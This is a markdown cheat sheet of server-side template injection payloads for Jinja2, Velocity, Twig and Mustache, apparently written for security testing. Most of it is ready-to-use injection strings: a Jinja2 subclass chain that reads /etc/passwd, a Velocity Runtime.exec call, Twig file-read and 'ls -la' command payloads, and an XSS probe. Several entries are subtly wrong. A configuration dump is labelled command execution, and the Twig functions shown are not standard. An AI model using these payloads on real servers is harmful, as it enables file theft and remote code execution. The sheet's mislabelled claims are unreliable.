# `Server-Side Template Injection`

Server-Side Template Injection (SSTI) is a security vulnerability that occurs when an application allows an attacker to inject malicious content into a server-side template. Server-side templates are used by web applications to dynamically generate HTML, XML, or other markup languages. These templates often include placeholders or variables that are replaced with actual data when the template is rendered on the server.

### Simple SSTI Check:
    Input: {{ 7 * 7 }}
    Expected Output: 49
    Purpose: Check if basic arithmetic operations are evaluated in the template.

### String Concatenation:
    Input: {{ 'Hello' ~ 'World' }}
    Expected Output: HelloWorld
    Purpose: Verify if string concatenation is allowed.

### Context Testing:
    Input: {{ '<script>alert("XSS")</script>' }}
    Expected Output: Check if the input is treated as plain text or executed as JavaScript.

### Error-Based Testing:
    Input: {{ 1/0 }}
    Expected Output: An error message indicating division by zero.
    Purpose: Trigger an error to identify how the application handles errors.

## Jinja2 (Python):

### File Reading:
    Input: {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    Expected Output: Content of the /etc/passwd file.
    Purpose: Check if it's possible to read files on the server.

### Command Execution:
    Input: {{ config.items() }}
    Expected Output: Configuration information (if available).
    Purpose: Attempt to execute commands and extract sensitive information.

## Velocity (Apache Velocity):

### Java Class Loading:
        Input: $class.getClassLoader().loadClass("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null).exec("calc")
        Expected Output: Launch the calculator on Windows.
        Purpose: Test for Java class loading and code execution.

## Twig (PHP):

### File Reading (Twig):
        Input: {{ file_get_contents('/etc/passwd') }}
        Expected Output: Content of the /etc/passwd file.
        Purpose: Similar to Jinja2, check if it's possible to read files on the server.

### Command Execution (Twig):
        Input: {% set cmd = 'ls -la' %} {{ cmd | passthru }}
        Expected Output: Output of the ls -la command.
        Purpose: Test for command execution in Twig templates.

## Mustache (Logic-less templates):

### Basic Mustache Injection:
        Input: {{#payload}}{{/payload}}
        Expected Output: Check if payload is treated as plain text or evaluated.
        Purpose: Evaluate how Mustache handles variable substitution.